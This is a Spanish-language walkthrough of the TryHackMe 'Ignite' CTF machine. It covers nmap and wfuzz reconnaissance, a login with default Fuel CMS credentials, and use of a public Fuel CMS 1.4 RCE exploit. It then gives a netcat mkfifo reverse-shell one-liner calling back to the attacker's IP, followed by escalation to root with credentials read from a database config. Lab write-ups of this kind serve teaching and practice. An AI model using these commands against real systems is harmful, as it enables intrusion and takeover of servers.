---
layout: post
author: Isui
title: Ignite TryHackMe Spanish Walkthrough
---
![Banner Ignite](/images/ignite/1.png 'Banner')
#TryHackMe 

# Reconocimiento
Comencé realizando una trama ICMP al target:
```
┌──(isui㉿kali)-[~/TryHackMe/ignite]
└─$ ping -c 1 10.10.33.48 
PING 10.10.33.48 (10.10.33.48) 56(84) bytes of data.
64 bytes from 10.10.33.48: icmp_seq=1 ttl=63 time=154 ms

--- 10.10.33.48 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 153.829/153.829/153.829/0.000 ms
┌──(isui㉿kali)-[~/TryHackMe/ignite]
└─$ 
```

En base a la respuesta del TTL de `63` que es muy aproximado a `64`, puedo intuir que se trata de un SO en base Linux.
#### Escaneo con Nmap
Continue con un escaneo de reconocimiento intentado que sea silencioso, pero al mismo tiempo rápido, con `nmap`:
```
sudo nmap -p- --open -sS --min-rate 1000 -vv -n -Pn 10.10.33.48 -oG primerEscaneo
```

Este escaneo tuvo los siguiente resultados:
```
┌──(isui㉿kali)-[~/TryHackMe/ignite]
└─$ sudo nmap -p- --open -sS --min-rate 1000 -vv -n -Pn 10.10.33.48 -oG primerEscaneo 
[sudo] password for isui: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-28 16:05 CST
Initiating SYN Stealth Scan at 16:05
Scanning 10.10.33.48 [65535 ports]
Discovered open port 80/tcp on 10.10.33.48
Completed SYN Stealth Scan at 16:05, 45.46s elapsed (65535 total ports)
Nmap scan report for 10.10.33.48
Host is up, received user-set (0.15s latency).
Scanned at 2024-06-28 16:05:00 CST for 45s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 45.57 seconds
           Raw packets sent: 67521 (2.971MB) | Rcvd: 67521 (2.701MB)
┌──(isui㉿kali)-[~/TryHackMe/ignite]
└─$ 
```

Se observa que solo esta el puerto **80** abierto y ejecutando un servicio HTTP, para realizar un escaneo más exhaustivo, se ejecuto:
```
sudo nmap -p80 -sC -sV 10.10.33.48 -A -oN target
```

El escaneo expuso el siguiente resultado:
```
┌──(isui㉿kali)-[~/TryHackMe/ignite]
└─$ sudo nmap -p80 -sC -sV 10.10.33.48 -A -oN target                                  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-28 16:08 CST
Nmap scan report for 10.10.33.48
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS
| http-robots.txt: 1 disallowed entry 
|_/fuel/
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (93%), Linux 3.10 (93%), Linux 3.12 (93%), Linux 3.19 (93%), Linux 3.2 - 4.9 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   151.91 ms 10.21.0.1
2   152.17 ms 10.10.33.48

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.23 seconds
┌──(isui㉿kali)-[~/TryHackMe/ignite]
└─$ 
```

Visto desde una herramienta `batcat target -l java` se ve así (batcat es como cat, pero con algunas funcionalidades extras):

![](/images/ignite/Pasted image 20240628161126.png)

Esté escaneo revelo la versión del servicio HTTP, y la existencia del documento Robots.txt.
Visitando desde el navegador, el sitio se puede ver que se trata de una posible guía para configurar un servicio CMS, específicamente Fuel CMS 1.4.

![](/images/ignite/Pasted image 20240628162723.png)

Se realizo un reconocimiento con la herramienta `whatweb`:

![](/images/ignite/Pasted image 20240628162839.png)

# Enumeración
Se utilizo la herramienta `wfuzz` para realizar un ataque de diccionario en contra del servicio HTTP, para un List Directory:
```
wfuzz -c -t 100 -W /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt --hc 404 --hw 933 http://10.10.33.48/FUZZ
```

**Explicación del WFUZZ**  

- **`wfuzz`**:
    
    - Es la herramienta utilizada para fuzzing de aplicaciones web. Permite buscar vulnerabilidades y puntos de entrada en la aplicación web mediante la automatización de solicitudes HTTP.
- **`-c`**:
    
    - Esta opción indica que la salida debe ser coloreada, lo que facilita la lectura de los resultados en la terminal.
- **`-t 100`**:
    
    - Especifica el número de hilos (threads) a utilizar. En este caso, `100` hilos se utilizarán para realizar las solicitudes concurrentemente, aumentando la velocidad del fuzzing.
- **`-W /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt`**:
    
    - Indica el archivo de lista de palabras a utilizar. Aquí se está usando una lista de directorios y archivos comunes proporcionada por DirBuster (`directory-list-2.3-medium.txt`), que se encuentra en el directorio `/usr/share/wordlist/dirbuster/`.
- **`--hc 404`**:
    
    - `--hc` significa "hide code" (ocultar código). Esta opción indica a `wfuzz` que oculte las respuestas HTTP con el código de estado `404` (Not Found), ya que típicamente indican que el recurso no existe y no son de interés.
- **`--hw 933`**:
    
    - `--hw` significa "hide words" (ocultar palabras). Esta opción indica a `wfuzz` que oculte las respuestas que tienen exactamente `933` palabras en el cuerpo de la respuesta. Esto puede ser útil para filtrar respuestas no interesantes o repetitivas.
- **`http://10.10.33.48/FUZZ`**:
    
    - Es la URL objetivo donde se realizará el fuzzing. `FUZZ` es un marcador de posición que `wfuzz` reemplazará con cada entrada de la lista de palabras

Este ataque de FUZZING dio los siguientes resultados:

![](/images/ignite/Pasted image 20240628163932.png)

Seguí enumerando, pero esta vez con un script de `nmap`

![](/images/ignite/Pasted image 20240628165337.png)

Esta información, resulto no ser, realmente útil.

Revisando, la guía de instalación del CMS, se muestran contraseñas en texto claro, para ingresar al aplicativo:

![](/images/ignite/Pasted image 20240628164735.png)

Así como un link para acceder al aplicativo:

![](/images/ignite/Pasted image 20240628164831.png)

Ingresando estas credenciales, se logro acceder al aplicativo:

![](/images/ignite/Pasted image 20240628164924.png)

Intente subir algún archivo, para saber si era posible establecer algún tipo de conexión:

![](/images/ignite/Pasted image 20240628165243.png)

Pero no obtuve resultados. Luego intente crear una entrada de lo que parece ser un blog, para investigar si podría investigar sobre alguna vulnerabilidad en el sistema:

![](/images/ignite/Pasted image 20240628165524.png)

Luego, cree un usuario:

![](/images/ignite/Pasted image 20240628165744.png)

Y lo logre, pero no encontré ninguna utilidad, en estas pruebas para completar el CTF, pero por supuesto es una vulnerabilidad muy grande, dado que un actor malintencionado, pude llegar a acceder al aplicativo, y crear un usuario con todos los posibles permisos.

![](/images/ignite/Pasted image 20240628165942.png)

Seguí durante un tiempo buscando, dentro del aplicativo, pero a primera vista no logre encontrar un vulnerabilidad. Revisando, recordé que en la página principal, se encontraba a primera vista la versión del aplicativo CMS: `fuel 1.4`,  así que por medio de `searchexploit` realice la búsqueda:

```
searchsploit fuel cms 1.4
```

![](/images/ignite/Pasted image 20240628171501.png)

El primer exploit parce ser muy interesante, por que indica que se trata de RMC con Python:

# Explotación

Para ver el código y ajustarlo a mis necesidades, lo copie a mi directorio de trabajo
```
searchsploit -m 47138
```

![](/images/ignite/Pasted image 20240628171741.png)

Luego con nano, edite el archivo, para ingresar la dirección IP del Target:

![](/images/ignite/Pasted image 20240628171946.png)

Al ejecutar este exploit, obtuve muchos errores:

![](/images/ignite/Pasted image 20240628172341.png)

Intente modificar el código, pero no tuve éxito, así que opte por utilizar otro exploit:

![](/images/ignite/Pasted image 20240628172507.png)

Revisando el código del exploit, vi que la forma de utilizarlo, es ejecutando, y agregar la dirección IP:

```
python3 50477.py -u http://10.10.33.48
```

El exploit funciono correctamente, y se logro establecer una conexón con el target:

![](/images/ignite/Pasted image 20240628172831.png)

Se comenzó, por listar los recursos del directorio actual:

![](/images/ignite/Pasted image 20240628173306.png)

Para listar todos los posibles directorios y archivos, y econtrar más vectores de ataque, se utilizo el comando:

```
ls -la ../../../*
```

![](/images/ignite/Pasted image 20240628173524.png)

Se listo el directorio del usuario: www-data:

![](/images/ignite/Pasted image 20240628174629.png)

Para tener una conexión más estable, implemente una ReverShell con Netcat:

En Kali
```
rlwrap nc -vlnp 445
```
En el Target:
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.21.16.176 445 >/tmp/f
```
Fuente de la `revershell`: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

![](/images/ignite/Pasted image 20240628175721.png)

Una vez establecida la conexión, realice el tratamiento de la TTY:

![](/images/ignite/Pasted image 20240628180110.png)

Ya con una shell interactiva, ahora tocaba escalar privilegios.
# Escalada de Privilegios:
Recordé que en la página principal, se explicaba sobre una base de datos:

![](/images/ignite/Pasted image 20240628180314.png)

Dentro del target navegue hasta llegar a la ruta indicada:

![](/images/ignite/Pasted image 20240628180735.png)

Y listando el archivo de la base de datos, logre encontrar información del usuario y contraseña del ROOT:

![](/images/ignite/Pasted image 20240628180908.png)

Así que ahora se pude cambiar al usuario ROOT:

![](/images/ignite/Pasted image 20240628181101.png)

Y buscando en el directorio del root, se puede obtener la flag:

![](/images/ignite/Pasted image 20240628181246.png)
---------------------------------------------------

tHanks f0r read1ng w1th L0v3 Isu <3

And H4ppy H4cking!